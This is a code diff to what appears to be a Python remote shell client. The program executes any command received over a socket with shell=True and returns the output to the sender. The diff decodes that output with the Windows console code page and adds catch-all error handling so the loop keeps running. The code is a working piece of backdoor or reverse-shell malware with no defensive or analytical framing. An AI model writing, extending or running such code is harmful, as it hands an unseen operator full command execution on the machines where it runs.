@@ -20,10 +20,14 @@ def main():
         output = ""
         try:
             output = subprocess.check_output(response["message"], shell=True)
-            output = output.decode()
+            output = str(output, encoding="437")
         except subprocess.CalledProcessError as e:
             output = "Error: " + str(e)
             print("Error:", e)
+        except Exception as e:
+            output = "Error: " + str(e)
+            print("Error:", e)
+        print("Output:", output)
         client_socket.sendall(json.dumps({"message": output}).encode())
 
     client_socket.close()
